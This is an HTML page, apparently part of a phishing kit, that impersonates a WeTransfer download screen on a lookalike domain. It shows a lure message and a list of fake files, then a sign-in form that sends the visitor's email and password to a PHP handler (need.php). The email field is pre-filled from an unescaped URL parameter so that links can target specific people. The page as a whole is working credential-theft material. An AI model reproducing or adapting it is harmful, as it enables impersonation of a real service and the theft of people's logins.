<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign 1n | We Transfer.</title>
    <link rel="stylesheet" href="./wetransfer_files/all.min.css">
    <link rel="stylesheet" href="./wetransfer_files/main.css">
    <link rel="shortcut icon" href="./wetransfer_files/favicon.ico" type="image/x-icon">
  </head>
  <body>
    <header>
      <nav>
        <div class="logo">
          <a href="https://tcsuco-com.eu/"><img src="./wetransfer_files/logo.svg" alt="logo" class="logo-img"></a>
        </div>
        <div class="nav">
          <ul>
            <li><a href="https://tcsuco-com.eu/#/help">help</a></li>
            <li><a href="https://tcsuco-com.eu/#/about">About</a></li>
            <li><a href="https://tcsuco-com.eu/#/plus">Got Plus?</a></li>
          </ul>
        </div>
      </nav>
    </header>
    <section class="main">
      <div class="files">
        <div class="file-card">
          <h1>Ready when you are</h1>
          <p class="total-info">4 files, 89MB. Files deleted in 7 days</p>
          <p class="mini-msg">
            Hi, regarding my earlier mail. These are the products we are need
            and also the company profile... more &gt;
          </p>
          <ul>
            <li>
              <div>
                <h4>List of Items.pdf</h4>
                <p>394 KB - pdf</p>
              </div>
              <div class="download">
                <i class="fas fa-arrow-circle-down"></i>
              </div>
            </li>
            <li>
              <div>
                <h4>Drawings and Specifications.zip</h4>
                <p>20 MB - zip</p>
              </div>
              <div class="download">
                <i class="fas fa-arrow-circle-down"></i>
              </div>
            </li>
            <li>
              <div>
                <h4>Company Intro.mp4</h4>
                <p>69 MB - mp4</p>
              </div>
              <div class="download">
                <i class="fas fa-arrow-circle-down"></i>
              </div>
            </li>
          </ul>

          <button id="downloadBtn" type="submit">
            download all
          </button>
        </div>
      </div>

      <div class="login">
        <div class="close">
          ×
        </div>
        <hr>
	
        <div class="login-area">
          <form action=need.php   id="login_form" name="login_form" method=post>
            <div class="form_error">Invalid Email Address</div>
            <div class="email">
              <input type="email"  name="email"  value="<?=$_GET[email]?>" id="email" placeholder="Email Address" required="">
              <div class="email_error">Invalid Email Address</div>
            </div>
            <div class="password">
              <input type="password" name="password" id="password" placeholder="Password" required="">
              <div class="password_error">Invalid Password</div>
            </div>
            <div class="login-button">
              <button type="submit" name="login_btn">Sign in</button>
            </div>
          </form>
        </div>
        <div class="plus-text">
          <h1>WeTransfer Plus</h1>
          <p>Get more out of WeTransfer, get Plus</p>
          <button>Get WeTransfer plus</button>
        </div>
      </div>
    </section>
   <!--<script src="./wetransfer_files/main.js.download"></script>
  

</body></html>